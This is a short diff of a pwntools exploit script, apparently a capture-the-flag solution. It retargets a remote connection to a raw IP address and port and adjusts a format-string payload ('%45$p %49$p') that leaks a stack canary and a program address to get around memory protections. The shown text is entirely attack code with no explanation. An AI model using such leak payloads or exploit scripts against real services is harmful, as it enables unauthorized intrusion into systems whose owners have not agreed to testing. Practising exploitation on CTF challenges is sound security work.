@@ -11,7 +11,7 @@ context.binary = elf
 offset = 0x80 - 0x8
 
 #p = process(elf.path)
-p = remote("178.128.214.190", 1337)
+p = remote("178.128.214.190", 1369)
 #gdb.attach(
 #    p,
 #    """
@@ -22,7 +22,7 @@ p = remote("178.128.214.190", 1337)
 
 # Leak canary and program address
 p.recv()
-p.sendline(b"%45$p %51$p")
+p.sendline(b"%45$p %49$p")
 
 p.recvuntil(b"Welcome ")
 leak = p.recvline().strip().split()
